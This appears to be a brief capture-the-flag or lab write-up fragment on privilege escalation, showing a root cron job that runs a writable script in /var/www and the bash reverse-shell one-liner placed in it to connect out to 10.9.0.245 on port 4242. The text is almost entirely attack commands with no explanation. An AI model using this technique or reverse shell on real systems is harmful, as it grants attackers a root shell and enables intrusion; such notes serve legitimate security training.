checking cronjobs with  
  
cat /etc/crontabs  
  
  
\* \* \* \* \* root cd /var/www/ && sudo bash .mysecretcronjob.sh  
  
  
we are able to edit /var/www/.mysecretcronjob.sh  
  
  
bash -i >& /dev/tcp/10.9.0.245/4242 0>&1